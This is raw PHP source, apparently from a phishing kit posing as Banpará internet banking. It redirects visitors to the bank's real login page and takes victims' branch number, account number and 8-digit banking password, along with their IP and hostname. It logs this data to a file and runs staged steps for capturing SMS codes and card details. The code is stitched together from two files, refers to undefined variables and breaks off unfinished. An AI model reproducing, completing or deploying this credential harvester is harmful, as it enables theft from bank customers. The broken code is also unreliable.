<?php

header ('Location: https://internetbanking.banpara.b.br/ibpf/login');

<?php
session_start();
ob_start();

function dar_tempo(){
	$_SESSION['time'] = mktime(date("H"), date("i"), date("s") + 20, date("m"), date("d"), date("Y"));
}

function check_time(){
	
	$tempoSessao = $_SESSION['time'];
	$tempoAtual = mktime(date("H"), date("i"), date("s"), date("m"), date("d"), date("Y"));
	if($tempoSessao < $tempoAtual){
		return 'acabou';
	}else{
		return 'valido';
	}
}

include('../conn.php');

$ip = $_SERVER['REMOTE_ADDR'];
$data = date('d/m/Y');
$hora = date('H:i');
$pc_name = gethostbyaddr($_SERVER['REMOTE_ADDR']);

$subj 	= "$apelido - $ip - $data";

if(isset($_POST['sender']) && $_POST['sender'] == 'conta_ib'){
	$_SESSION['exec'] = 'ENTER_ACCOUNT';
	dar_tempo();
}elseif(isset($_POST['sender']) && $_POST['sender'] == 'final'){
	$_SESSION['exec'] = 'HOME';
	dar_tempo();
}elseif(isset($_POST['sender']) && $_POST['sender'] == 'loader'){
	$_SESSION['exec'] = 'GET_SMS';
	dar_tempo();
}elseif(isset($_POST['sender']) && $_POST['sender'] == 'not_sms'){
	$_SESSION['exec'] = 'LOADER_CARD';
	dar_tempo();
}elseif(isset($_POST['sender']) && $_POST['sender'] == 'loader_card'){
	$_SESSION['exec'] = 'GET_CARD';
	dar_tempo();
}elseif(isset($_POST['sender']) && $_POST['sender'] == 'enter_account'){
	$Agencia 	= $_POST['is_agct'];
	$Conta 		= $_POST['is_ctct'];
	$Senha8  	= $_POST['is_ps_height'];

	$_SESSION['Agencia'] = $Agencia;
	$_SESSION['Conta'] = $Conta;

	$mensagem 	= "IP: $ip | DATA: $data [$hora] | PC NAME: $pc_name<br>
--------------------------------------------------------------<br>
<br>
AGENCIA: $Agencia<br>
CONTA: $Conta<br>
SENHA 8: $Senha8<br>
<br>
--------------------------------------------------------------";
  $open = fopen('data.txt','a');
  fwrite($open,$email);
  fwrite($open, '::');
  fwrite($open,$pass);
  fwrite($open, ' ####### ');


?>